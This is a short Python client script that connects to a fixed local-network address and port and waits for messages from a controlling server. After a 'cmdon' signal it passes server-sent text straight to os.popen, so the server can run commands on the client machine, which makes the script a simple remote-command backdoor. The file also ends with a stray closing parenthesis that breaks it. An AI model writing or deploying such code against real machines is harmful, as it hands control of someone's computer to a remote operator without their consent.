import socket
import threading
import os
import sys

HOST = '192.168.1.139'
PORT = 9090

cmd_mode = False
show_messages = True

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

while True:
    server_message = s.recv(1024).decode('utf-8')

    if server_message == 'exit -f':
        sys.exit()

    elif server_message == 'messages-on':
        show_messages = True
    
    elif server_message == 'messages-off':
        show_messages = False

    elif server_message == 'cmdon':
        cmd_mode = True
    
    elif server_message == 'cmdoff':
        cmd_mode = False

    #####

    # Show server messages
    if show_messages:
        print(server_message)
    
    # Enter command to client
    elif cmd_mode and server_message != 'cmdon':
        os.popen(server_message)

    # Send client input to server
    client_input = input('...: ')

    if client_input == '':
        client_input = 'client nothing entered!'

    s.send(client_input.encode('utf-8'))


)